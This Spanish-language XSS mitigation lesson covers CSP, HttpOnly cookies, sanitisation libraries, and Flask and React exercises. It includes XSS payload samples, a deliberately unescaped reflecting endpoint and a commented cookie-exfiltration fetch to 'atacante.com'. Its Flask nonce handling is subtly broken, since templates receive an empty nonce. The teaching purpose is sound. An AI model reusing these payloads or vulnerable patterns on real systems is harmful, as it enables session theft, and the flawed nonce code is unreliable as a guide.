# Clase 23: XSS - Practica y Mitigaciones

**Duracion:** 2 horas

---

## Objetivos de Aprendizaje

1. Implementar Content Security Policy (CSP) estricta y relajada
2. Configurar HttpOnly cookies y entender su funcionamiento
3. Sanitizar HTML con librerias como bleach y DOMPurify
4. Identificar y corregir XSS en aplicaciones React
5. Escribir reglas CSP explicando cada directiva

---

## Contenido Detallado

### 1. Content Security Policy (CSP) en Profundidad

CSP es un header HTTP que permite controlar que recursos puede cargar y ejecutar una pagina web. Es la defensa mas efectiva contra XSS.

#### Directivas Principales

| Directiva | Controla |
|-----------|----------|
| `default-src` | Fallback para todas las directivas no especificadas |
| `script-src` | Fuentes permitidas para scripts |
| `style-src` | Fuentes permitidas para hojas de estilo |
| `img-src` | Fuentes permitidas para imagenes |
| `connect-src` | URLs permitidas para fetch, XHR, WebSocket |
| `font-src` | Fuentes permitidas para tipografias |
| `frame-src` | Fuentes permitidas para iframes |
| `frame-ancestors` | Quien puede incrustar la pagina en un iframe |
| `form-action` | URLs permitidas como destinos de formularios |
| `base-uri` | URLs permitidas para el tag `<base>` |
| `object-src` | Fuentes permitidas para plugins (Flash, Java) |
| `report-uri` / `report-to` | URL donde enviar reportes de violaciones CSP |

#### Keywords Especiales

| Keyword | Significado |
|---------|-------------|
| `'none'` | No permite nada |
| `'self'` | Solo el mismo origen (protocolo + dominio + puerto) |
| `'unsafe-inline'` | Permite scripts/styles inline (reduce seguridad) |
| `'unsafe-eval'` | Permite `eval()`, `setTimeout(string)`, `new Function()` |
| `'strict-dynamic'` | Permite scripts cargados por scripts confiables |
| `'nonce-<valor>'` | Permite scripts con el nonce correcto (recomendado) |
| `<hash-algo>-<hash>` | Permite script cuyo hash coincida (sha256, sha384, sha512) |

#### CSP Estricta vs. Relajada

**CSP Estricta (recomendada para produccion):**
```
default-src 'none';
script-src 'self' 'nonce-RANDOM';
style-src 'self';
img-src 'self';
connect-src 'self';
frame-ancestors 'none';
form-action 'self';
base-uri 'self';
object-src 'none';
```

**CSP Relajada (para desarrollo o migracion):**
```
default-src 'self';
script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdnjs.cloudflare.com;
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
img-src 'self' data: https:;
font-src 'self' https://fonts.gstatic.com;
connect-src 'self' ws: wss:;
```

### 2. HttpOnly Cookies

La flag `HttpOnly` en una cookie impide que JavaScript del lado del cliente acceda a ella mediante `document.cookie`. Esto protege contra el robo de cookies via XSS.

**Como configurar HttpOnly:**

```python
# Flask
response.set_cookie('session_id', value='abc123', httponly=True, secure=True, samesite='Lax')

# Django
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_SAMESITE = 'Lax'

# Express (Node.js)
res.cookie('session_id', 'abc123', { httpOnly: true, secure: true, sameSite: 'Lax' });
```

**Flags de cookies:**

| Flag | Descripcion |
|------|-------------|
| `HttpOnly` | Inaccesible via JavaScript |
| `Secure` | Solo se envia por HTTPS |
| `SameSite=Lax` | No se envia en requests cross-site (protege CSRF) |
| `SameSite=Strict` | No se envia en ningun contexto cross-site |
| `Max-Age` / `Expires` | Tiempo de vida de la cookie |

### 3. Sanitizacion

#### Python: bleach

```python
import bleach

# Permite solo tags y atributos seguros
allowed_tags = ['p', 'b', 'i', 'u', 'a', 'strong', 'em', 'br', 'ul', 'ol', 'li']
allowed_attrs = {'a': ['href', 'title'], 'img': ['src', 'alt']}

safe_html = bleach.clean(user_input,
    tags=allowed_tags,
    attributes=allowed_attrs,
    strip=True  # Eliminar tags no permitidos
)
```

#### JavaScript: DOMPurify

```javascript
// DOMPurify - sanitizacion en el lado del cliente
import DOMPurify from 'dompurify';

const dirty = '<img src=x onerror=alert(1)><p>Texto seguro</p>';
const clean = DOMPurify.sanitize(dirty);
// Resultado: '<p>Texto seguro</p>'
```

#### Java: OWASP Java Encoder

```java
import org.owasp.encoder.Encode;

// Para contexto HTML
String safeHTML = Encode.forHtml(userInput);

// Para contexto de atributo HTML
String safeAttr = Encode.forHtmlAttribute(userInput);

// Para contexto JavaScript
String safeJS = Encode.forJavaScript(userInput);
String safeJSBlock = Encode.forJavaScriptBlock(userInput);

// Para contexto URL
String safeURL = Encode.forUriComponent(userInput);

// Para contexto CSS
String safeCSS = Encode.forCssString(userInput);
```

### 4. Plantillas Seguras

#### Jinja2 (Flask)

Jinja2 tiene autoescape habilitado por defecto en archivos `.html`. Escapa `<`, `>`, `&`, `"`, `'`.

```html
<!-- SEGURO: autoescape activo por defecto -->
<p>{{ usuario_input }}</p>

<!-- Si NECESITAS HTML (cuidado): usar |safe solo si confias -->
<p>{{ contenido_confiable|safe }}</p>

<!-- Desactivar autoescape para bloques especificos -->
{% autoescape false %}
{{ contenido_inseguro }}  <!-- PELIGROSO -->
{% endautoescape %}
```

#### React JSX

React escapa automaticamente todo valor insertado con `{}`.

```jsx
// SEGURO: React escapa automaticamente
function Comentario({ texto }) {
    return <div>{texto}</div>;  // texto se escapa, no se interpreta como HTML
}

// PELIGROSO: dangerouslySetInnerHTML
function ComentarioRaw({ html }) {
    return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// SEGURO si necesitas renderizar HTML: usar DOMPurify
import DOMPurify from 'dompurify';

function ComentarioSeguro({ html }) {
    const clean = DOMPurify.sanitize(html);
    return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

### 5. X-XSS-Protection (Obsoleto en Chromium)

El header `X-XSS-Protection` activaba el filtro XSS integrado de IE/Edge/Chrome (antiguo). Chrome eliminó este filtro en 2019 porque introducia vulnerabilidades adicionales.

```http
X-XSS-Protection: 1; mode=block
```

Actualmente se recomienda usar CSP en lugar de confiar en X-XSS-Protection.

---

## Ejercicio 1: Implementar CSP en Flask para Bloquear XSS

### Escenario

Implementar CSP headers en una aplicacion Flask que tiene un formulario de busqueda y un panel de administracion.

```python
"""
app_csp.py - Implementacion completa de CSP en Flask
"""
from flask import Flask, request, jsonify, make_response, render_template_string
import os
import secrets
import logging

app = Flask(__name__)

# ============================================================
# CONFIGURACION CSP
# ============================================================

class CSPBuilder:
    """Construye politica CSP segura con nonce"""

    def __init__(self):
        self.directives = {}

    def add(self, directive, *values):
        """Agrega una directiva CSP"""
        if directive not in self.directives:
            self.directives[directive] = []
        self.directives[directive].extend(values)

    def build(self):
        """Construye el string de politica CSP"""
        parts = []
        for directive, values in self.directives.items():
            if values:
                parts.append(f"{directive} {' '.join(values)}")
            else:
                parts.append(directive)
        return "; ".join(parts)


def get_csp_policy(nonce):
    """
    Construye una politica CSP estricta con nonce.
    Explicacion de cada directiva:
    """
    csp = CSPBuilder()

    # default-src 'none': Por defecto no permitir nada.
    # Cada recurso debe ser explicitamente permitido.
    csp.add("default-src", "'none'")

    # script-src 'self' 'nonce-...': Solo scripts del mismo origen
    # o con el nonce correcto en el atributo <script nonce="...">
    # Esto bloquea XSS porque el atacante no puede adivinar el nonce.
    csp.add("script-src", "'self'", f"'nonce-{nonce}'")

    # style-src 'self': Solo estilos del mismo origen.
    # No permitir 'unsafe-inline' para evitar CSS injection.
    # Si necesitas estilos inline, agregar 'unsafe-inline' o usar nonce.
    csp.add("style-src", "'self'")

    # img-src 'self': Solo imagenes del mismo origen.
    # Bloquea imagenes como vectores de exfiltracion.
    csp.add("img-src", "'self'")

    # font-src 'self': Solo tipografias del mismo origen.
    csp.add("font-src", "'self'")

    # connect-src 'self': Solo conexiones XHR/fetch al mismo origen.
    # Bloquea exfiltracion de datos via fetch/XHR.
    csp.add("connect-src", "'self'")

    # frame-ancestors 'none': Previene que la pagina sea cargada
    # en iframes (protege contra clickjacking).
    csp.add("frame-ancestors", "'none'")

    # form-action 'self': Solo formularios pueden enviar datos al mismo origen.
    # Bloquea phishing que envia datos a servidor del atacante.
    csp.add("form-action", "'self'")

    # base-uri 'self': Solo el mismo origen puede ser base URI.
    # Previene ataques de base URI injection.
    csp.add("base-uri", "'self'")

    # object-src 'none': Bloquea plugins (Flash, Java, ActiveX).
    csp.add("object-src", "'none'")

    return csp.build()


def get_relaxed_csp_policy(nonce):
    """Politica CSP relajada para desarrollo/testing"""
    return (
        "default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}' 'unsafe-eval' https://cdnjs.cloudflare.com; "
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
        "img-src 'self' data: https:; "
        "font-src 'self' https://fonts.gstatic.com; "
        "connect-src 'self' ws: wss:; "
        "frame-ancestors 'none'; "
        "form-action 'self'; "
        "base-uri 'self'; "
        "object-src 'none'"
    )


# ============================================================
# MIDDLEWARE CSP
# ============================================================

@app.after_request
def add_csp(response):
    """Agrega CSP header a todas las respuestas HTML"""
    if response.content_type and 'text/html' in response.content_type:
        # Generar nonce aleatorio para cada request
        nonce = secrets.token_hex(16)
        csp = get_csp_policy(nonce)

        response.headers['Content-Security-Policy'] = csp
        # Almacenar nonce para usarlo en templates
        response.nonce = nonce

    # Otros security headers
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'

    return response


# ============================================================
# RUTAS
# ============================================================

@app.route('/')
def index():
    """Pagina principal con CSP nonce"""
    # Obtener nonce del response
    nonce = request.nonce if hasattr(request, 'nonce') else ''

    template = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>App Segura con CSP</title>
        <style nonce="{{ nonce }}">
            body { font-family: Arial; margin: 40px; }
            .safe { color: green; }
            .container { max-width: 600px; margin: auto; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1 class="safe">CSP Activo</h1>
            <p>Esta pagina tiene Content Security Policy con nonce.</p>

            <h2>Buscar:</h2>
            <form method="GET" action="/buscar">
                <input type="text" name="q" placeholder="Ingrese busqueda">
                <input type="submit" value="Buscar">
            </form>

            <script nonce="{{ nonce }}">
                // Este script se ejecuta porque tiene el nonce correcto
                console.log('Script con nonce ejecutado');
                document.getElementById('mensaje').textContent = 'CSP funcionando correctamente';
            </script>

            <p id="mensaje"></p>
        </div>
    </body>
    </html>
    """
    response = make_response(render_template_string(template, nonce=nonce))
    return response


@app.route('/buscar')
def buscar():
    query = request.args.get('q', '')
    nonce = request.nonce if hasattr(request, 'nonce') else ''

    # Escapar el input para prevenir XSS
    from html import escape
    safe_query = escape(query)

    template = """
    <!DOCTYPE html>
    <html>
    <head><title>Resultados de busqueda</title></head>
    <body>
        <h1>Resultados de busqueda</h1>
        <p>Buscaste: {{ query }}</p>
        <p>
            <!-- Intento de XSS: si inyectas <script>, CSP lo bloquea -->
            Tu busqueda se muestra de forma segura gracias a CSP y escape.
        </p>
        <a href="/">Volver</a>
    </body>
    </html>
    """
    response = make_response(render_template_string(template, query=safe_query, nonce=nonce))
    return response


@app.route('/api/reporte-csp', methods=['POST'])
def reporte_csp():
    """
    Endpoint que recibe reportes de violaciones CSP.
    Configurar report-uri / report-to para recibir estos reportes.
    """
    report = request.get_json(silent=True)
    if report:
        app.logger.warning(f"Violacion CSP detectada: {report}")
        # En produccion, enviar a SIEM o sistema de monitoreo
    return jsonify({'status': 'recibido'}), 200


# ============================================================
# DEMOSTRACION: Intento de XSS bloqueado por CSP
# ============================================================

@app.route('/demo')
def demo():
    """Pagina que demuestra como CSP bloquea XSS"""
    nonce = request.nonce if hasattr(request, 'nonce') else ''

    template = """
    <!DOCTYPE html>
    <html>
    <head><title>Demo CSP vs XSS</title></head>
    <body>
        <h1>Demostracion: CSP bloquea XSS</h1>

        <h2>1. Script inline SIN nonce (bloqueado):</h2>
        <script>alert('XSS sin nonce - BLOQUEADO');</script>
        <p style="color:gray">Este script no se ejecuta (no tiene nonce)</p>

        <h2>2. Script inline CON nonce (permitido):</h2>
        <script nonce="{{ nonce }}">
            console.log('Script con nonce - PERMITIDO');
        </script>
        <p style="color:green">Este script se ejecuta (tiene nonce valido)</p>

        <h2>3. Event handler inline (bloqueado):</h2>
        <button onclick="alert('Click - BLOQUEADO')">Click me</button>
        <p style="color:gray">Los event handlers inline son bloqueados</p>

        <h2>4. javascript: URL (bloqueado):</h2>
        <a href="javascript:alert('XSS - BLOQUEADO')">Link malicioso</a>
        <p style="color:gray">Las URLs javascript: son bloqueadas</p>
    </body>
    </html>
    """
    response = make_response(render_template_string(template, nonce=nonce))
    return response


if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    app.run(host='127.0.0.1', port=5000, debug=False)
```

**Probar la proteccion CSP:**

```bash
python app_csp.py
# Visitar http://127.0.0.1:5000/demo
# Abrir la consola del navegador para ver los errores CSP
```

---

## Ejercicio 2: App React Vulnerable - Identificar y Corregir XSS

### Escenario

Una aplicacion React tiene multiples vulnerabilidades XSS. Identificarlas y corregirlas.

**Version vulnerable (App.js):**

```jsx
import React, { useState, useEffect } from 'react';

function App() {
    const [comentarios, setComentarios] = useState([]);
    const [input, setInput] = useState('');
    const [search, setSearch] = useState('');

    useEffect(() => {
        // Vulnerabilidad 1: Leer hash de URL sin sanitizar
        const hash = window.location.hash.substring(1);
        if (hash) {
            document.getElementById('hash-output').innerHTML = hash;
        }
    }, []);

    const agregarComentario = () => {
        // Vulnerabilidad 2: Almacenar y renderizar sin sanitizar
        const newComentarios = [...comentarios, input];
        setComentarios(newComentarios);
        // Tambien guardar en localStorage
        localStorage.setItem('comentarios', JSON.stringify(newComentarios));
    };

    // Vulnerabilidad 3: Renderizar busqueda sin escapar
    const handleSearch = (e) => {
        setSearch(e.target.value);
    };

    return (
        <div>
            <h1>App de Comentarios</h1>

            {/* MOSTRAR BUSQUEDA SIN ESCAPAR */}
            <div>
                <input type="text" onChange={handleSearch} placeholder="Buscar..." />
                <p>Resultados para: <span id="search-result">{search}</span></p>
            </div>

            {/* FORMULARIO DE COMENTARIOS */}
            <div>
                <input
                    type="text"
                    value={input}
                    onChange={(e) => setInput(e.target.value)}
                />
                <button onClick={agregarComentario}>Agregar</button>
            </div>

            {/* LISTAR COMENTARIOS SIN SANITIZAR */}
            <ul>
                {comentarios.map((c, i) => (
                    <li key={i} dangerouslySetInnerHTML={{ __html: c }} />
                ))}
            </ul>

            {/* OUTPUT DE HASH SIN SANITIZAR */}
            <div id="hash-output"></div>
        </div>
    );
}

export default App;
```

**Version corregida (AppSegura.js):**

```jsx
import React, { useState, useEffect, useRef } from 'react';
import DOMPurify from 'dompurify';

function AppSegura() {
    const [comentarios, setComentarios] = useState([]);
    const [input, setInput] = useState('');
    const [search, setSearch] = useState('');
    const hashOutputRef = useRef(null);

    useEffect(() => {
        // CORREGIDO 1: Usar textContent en vez de innerHTML
        const hash = window.location.hash.substring(1);
        if (hash && hashOutputRef.current) {
            hashOutputRef.current.textContent = hash;
        }
    }, []);

    const agregarComentario = () => {
        // CORREGIDO 2: Escapar o sanitizar antes de almacenar
        const sanitized = DOMPurify.sanitize(input);
        const newComentarios = [...comentarios, sanitized];
        setComentarios(newComentarios);
        localStorage.setItem('comentarios', JSON.stringify(newComentarios));
    };

    const handleSearch = (e) => {
        // React escapa automaticamente en JSX, esto es seguro
        setSearch(e.target.value);
    };

    return (
        <div>
            <h1>App de Comentarios (Segura)</h1>

            {/* BUSQUEDA - React escapa por defecto en JSX */}
            <div>
                <input type="text" onChange={handleSearch} placeholder="Buscar..." />
                {/* CORREGIDO: Usar {search} en vez de innerHTML */}
                <p>Resultados para: <span>{search}</span></p>
            </div>

            {/* FORMULARIO */}
            <div>
                <input
                    type="text"
                    value={input}
                    onChange={(e) => setInput(e.target.value)}
                />
                <button onClick={agregarComentario}>Agregar</button>
            </div>

            {/* CORREGIDO 3: No usar dangerouslySetInnerHTML con datos no confiables */}
            <ul>
                {comentarios.map((c, i) => (
                    <li key={i}>{c}</li>  // React escapa automaticamente
                ))}
            </ul>

            {/* CORREGIDO 4: Usar ref y textContent */}
            <div ref={hashOutputRef}></div>
        </div>
    );
}

export default AppSegura;
```

---

## Ejercicio 3: Simular Cookie Stealing y Demostrar HttpOnly

### Escenario

Simular un ataque de robo de cookies donde una cookie sin HttpOnly puede ser robada via XSS, y demostrar que una cookie con HttpOnly es segura.

```python
"""
cookie_stealing_demo.py - Demostracion de HttpOnly vs no-HttpOnly
"""
from flask import Flask, request, jsonify, make_response
import logging

app = Flask(__name__)

@app.route('/')
def index():
    """Pagina que establece dos tipos de cookies"""
    response = make_response("""
    <!DOCTYPE html>
    <html>
    <head><title>Demo HttpOnly</title></head>
    <body>
        <h1>Demostracion de HttpOnly Cookies</h1>
        <p>Se han establecido 2 cookies:</p>
        <ul>
            <li><strong>session_insecure</strong>: Sin HttpOnly (accesible via JS)</li>
            <li><strong>session_secure</strong>: Con HttpOnly (NO accesible via JS)</li>
        </ul>

        <h2>Prueba 1: Intentar leer cookies con JavaScript</h2>
        <button onclick="testCookies()">Leer cookies</button>
        <pre id="output"></pre>

        <script>
        function testCookies() {
            var cookies = document.cookie;
            document.getElementById('output').textContent =
                'Cookies accesibles via JS: ' + (cookies || '(ninguna)');
        }
        </script>

        <h2>Prueba 2: Simular ataque XSS (reflejado)</h2>
        <form method="GET" action="/xss-test">
            <input type="text" name="payload" placeholder="Ingrese payload XSS">
            <input type="submit" value="Enviar">
        </form>
        <p>Ejemplo: <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
    </body>
    </html>
    """)

    # Cookie SIN HttpOnly (vulnerable a XSS)
    response.set_cookie(
        'session_insecure',
        value='este-es-mi-token-secreto-12345',
        httponly=False,  # Accesible via JavaScript
        secure=False,
        samesite='Lax'
    )

    # Cookie CON HttpOnly (protegida contra XSS)
    response.set_cookie(
        'session_secure',
        value='este-es-mi-token-ultra-seguro-67890',
        httponly=True,  # NO accesible via JavaScript
        secure=True,
        samesite='Lax'
    )

    return response


@app.route('/xss-test')
def xss_test():
    """Endpoint que refleja input - intencionalmente vulnerable para demostracion"""
    payload = request.args.get('payload', '')
    # No escapar intencionalmente para demostrar el ataque
    return f"""
    <!DOCTYPE html>
    <html>
    <body>
        <h1>Resultado del payload XSS</h1>
        <p>Ejecutando: {payload}</p>

        <h2>Cookies accesibles:</h2>
        <pre id="cookie-output"></pre>

        <script>
            // Si el atacante ejecuta: <script>fetch(...)</script>
            // Esto solo puede robar session_insecure (no HttpOnly)
            document.getElementById('cookie-output').textContent =
                'Cookies: ' + (document.cookie || 'Ninguna cookie accesible');

            // El atacante intentaria:
            // fetch('https://atacante.com/steal?c=' + document.cookie)
            // Pero solo obtiene session_insecure, NO session_secure
        </script>

        <p><strong>NOTA:</strong> La cookie <em>session_secure</em> con HttpOnly
        NO aparece en document.cookie</p>
        <a href="/">Volver</a>
    </body>
    </html>
    """


@app.route('/api/check-cookies')
def check_cookies():
    """API que muestra que cookies llegaron al servidor"""
    cookies = dict(request.cookies)
    app.logger.info(f"Cookies recibidas: {cookies}")
    return jsonify({
        'cookies_recibidas': cookies,
        'mensaje': 'Ambas cookies se envian automaticamente en cada request HTTP'
    })


@app.route('/api/steal-test')
def steal_test():
    """Simula el endpoint del atacante"""
    stolen = request.args.get('c', '')
    if stolen:
        app.logger.warning(f"COOKIE ROBADA (simulada): {stolen}")
    return jsonify({'status': 'logged'})


if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    app.run(host='127.0.0.1', port=5000)
```

**Explicacion del ejercicio:**

1. Al visitar `/`, se establecen dos cookies: una sin HttpOnly y otra con HttpOnly
2. `document.cookie` solo muestra la cookie sin HttpOnly
3. Un ataque XSS solo puede robar la cookie sin HttpOnly
4. La cookie con HttpOnly viaja en las requests HTTP pero es inaccesible via JavaScript
5. Verificar con `/api/check-cookies` que ambas cookies llegan al servidor

---

## Ejercicio 4: Escribir Reglas CSP Explicando Cada Directiva

### Escenario

Dados los siguientes escenarios, escribir la politica CSP adecuada con explicacion de cada directiva.

**Caso A: Sitio estatico sin recursos externos**

```csp
# Politica: Bloquear todo recurso externo
Content-Security-Policy:
    default-src 'self';       # Solo recursos del mismo origen
    script-src 'self';         # Solo scripts propios
    style-src 'self';          # Solo estilos propios
    img-src 'self';            # Solo imagenes propias
    font-src 'self';           # Solo tipografias propias
    connect-src 'self';        # Solo conexiones al mismo origen
    frame-ancestors 'none';    # No permitir iframes (protege clickjacking)
    form-action 'self';        # Formularios solo al mismo origen
    base-uri 'self';           # Base URI solo mismo origen
    object-src 'none';         # Bloquear plugins (Flash, Java)
```

**Caso B: App que usa Google Analytics, Google Fonts y CDN de Bootstrap**

```csp
Content-Security-Policy:
    default-src 'self';
    script-src 'self'
        https://www.googletagmanager.com   # Google Analytics/GTM
        https://www.google-analytics.com   # Analytics.js
        'nonce-{RANDOM}';                  # Scripts propios con nonce
    style-src 'self'
        https://fonts.googleapis.com        # Google Fonts styles
        'unsafe-inline';                    # Permitir estilos inline (necesario)
    img-src 'self'
        https://www.google-analytics.com    # Analytics pixel
        https://www.googletagmanager.com;   # GTM pixel
    font-src 'self'
        https://fonts.gstatic.com;          # Google Fonts files
    connect-src 'self'
        https://www.google-analytics.com;   # Analytics API
    frame-ancestors 'none';
    form-action 'self';
    base-uri 'self';
    object-src 'none';
```

**Caso C: App que necesita WebSockets y carga scripts de CDNs confiables**

```csp
Content-Security-Policy:
    default-src 'none';                     # No permitir nada por defecto
    script-src 'self'
        https://cdnjs.cloudflare.com        # Scripts desde CDN
        https://code.jquery.com             # jQuery desde CDN
        'strict-dynamic'                    # Confiar en scripts cargados por scripts confiables
        'nonce-{RANDOM}';                   # Scripts propios con nonce
    style-src 'self'
        'unsafe-inline';                    # Permitir estilos inline
    img-src 'self' data: blob:;             # Imagenes propias, data: URIs, blobs
    font-src 'self';                        # Tipografias propias
    connect-src 'self'
        wss://api.miapp.com                 # WebSocket seguro a API
        https://api.miapp.com;              # API REST
    frame-ancestors 'none';
    form-action 'self';
    base-uri 'self';
    object-src 'none';
    report-uri /csp-report;                 # Reportar violaciones para debugging
```

**Caso D: Migracion gradual (modo report-only)**

```csp
# Modo report-only: las violaciones se reportan pero NO se bloquean
Content-Security-Policy-Report-Only:
    default-src 'self';
    script-src 'self' 'unsafe-inline' 'unsafe-eval';
    style-src 'self' 'unsafe-inline';
    img-src 'self' https: data:;
    connect-src 'self' https:;
    frame-ancestors 'none';
    form-action 'self';
    base-uri 'self';
    object-src 'none';
    report-uri /csp-report;
```

---

## Preguntas y Respuestas

### Pregunta 1
**Como funciona CSP nonce-based y por que es mas seguro que 'unsafe-inline'?**

**Respuesta:** CSP nonce-based funciona generando un valor aleatorio (nonce) en cada request HTTP y agregandolo al header CSP como `script-src 'nonce-<valor>'`. Solo los tags `<script nonce="<valor>">` que tengan el nonce correcto se ejecutaran. El atacante no puede adivinar el nonce porque es generado aleatoriamente en el servidor para cada request. Es mas seguro que `'unsafe-inline'` porque este ultimo permite TODOS los scripts inline, incluidos los maliciosos. Con nonce, solo los scripts que el servidor marco explicitamente como confiables se ejecutan.

### Pregunta 2
**Que protege HttpOnly y que NO protege?**

**Respuesta:** HttpOnly protege contra el robo de cookies via XSS, porque impide que JavaScript acceda a la cookie mediante `document.cookie`. Sin embargo, HttpOnly NO protege contra: (1) CSRF (la cookie se envia automaticamente en requests), (2) ataques de red (packet sniffing si no se usa Secure + HTTPS), (3) ataques de lado del servidor (si el atacante compromete el servidor, puede leer las cookies), (4) XSS que modifica la pagina en lugar de robar cookies (ej: un XSS que cambia el formulario de login para phishing). HttpOnly debe combinarse con Secure, SameSite y CSP.

### Pregunta 3
**Cual es la diferencia entre CSP y X-XSS-Protection? Cual se recomienda actualmente?**

**Respuesta:** X-XSS-Protection era un filtro del navegador que intentaba detectar y bloquear XSS reflejado analizando las requests y respuestas. Fue eliminado de Chrome en 2019 porque tenia vulnerabilidades (podia ser evadido y en algunos casos introducia XSS). CSP es un mecanismo mucho mas completo y robusto que permite al servidor definir exactamente que recursos puede cargar la pagina. Se recomienda usar CSP en lugar de X-XSS-Protection. Ademas, CSP protege contra todos los tipos de XSS (reflejado, almacenado, DOM-based), no solo reflejado.

### Pregunta 4
**Como funciona DOMPurify y cuando deberia usarse en lugar del escape automatico?**

**Respuesta:** DOMPurify es una libreria de sanitizacion de HTML que elimina elementos peligrosos (scripts, event handlers, javascript: URLs, etc.) mientras preserva HTML seguro. Deberia usarse cuando necesitas permitir que los usuarios ingresen HTML con formato limitado (negritas, enlaces, listas) pero sin permitir scripts. El escape automatico (como `textContent` o la interpolacion de React) convierte todo en texto plano, lo cual es seguro pero pierde el formato. DOMPurify es un compromiso: permite HTML seguro y bloquea XSS. Siempre debe ejecutarse en el servidor, aunque puede usarse tambien en el cliente como capa adicional.

### Pregunta 5
**Es seguro usar dangerouslySetInnerHTML en React si sanitizas el contenido?**

**Respuesta:** Si, es seguro usar `dangerouslySetInnerHTML` si el contenido ha sido previamente sanitizado con una libreria como DOMPurify. Sin embargo, es mejor evitarlo siempre que sea posible. Las alternativas seguras son: (1) usar componentes de React en lugar de HTML strings (ej: convertir BBCode/Markdown a componentes React en lugar de a HTML), (2) usar `textContent` si no necesitas formato, (3) si necesitas renderizar HTML generado por el usuario, sanitizarlo con DOMPurify tanto en el cliente como en el servidor (defense in depth). El nombre `dangerouslySetInnerHTML` es intencional: React te obliga a reconocer explicitamente que estas haciendo algo peligroso.

### Pregunta 6
**Que directiva CSP bloquearia un iframe de atacante.com cargado en tu sitio?**

**Respuesta:** La directiva `frame-src` controla que origenes pueden cargarse en iframes dentro de tu pagina. Para bloquear un iframe de `atacante.com`, usarias `frame-src 'self'` (solo iframes del mismo origen) o `frame-src 'none'` (ningun iframe permitido). Para prevenir que TU sitio se cargue en iframes de otros sitios (proteccion contra clickjacking), se usa `frame-ancestors 'none'` o `frame-ancestors 'self'`. Ambas directivas son complementarias: `frame-src` controla que cargas dentro de tu pagina, `frame-ancestors` controla donde se puede cargar tu pagina.

---

## Tarea / Lectura Recomendada

1. **Leer:** OWASP Content Security Policy Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
2. **Leer:** MDN Web Docs - CSP: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
3. **Practicar:** CSP Evaluator de Google - https://csp-evaluator.withgoogle.com/ (analizar politicas CSP)
4. **Experimentar:** Usar la app Flask del ejercicio 1 y probar diferentes politicas CSP
5. **Leer:** DOMPurify documentation - https://github.com/cure53/DOMPurify
6. **Profundizar:** Investigar "CSP bypass techniques" para entender como los atacantes evaden CSP
7. **Practicar:** PortSwigger CSP labs - https://portswigger.net/web-security/cross-site-scripting/content-security-policy


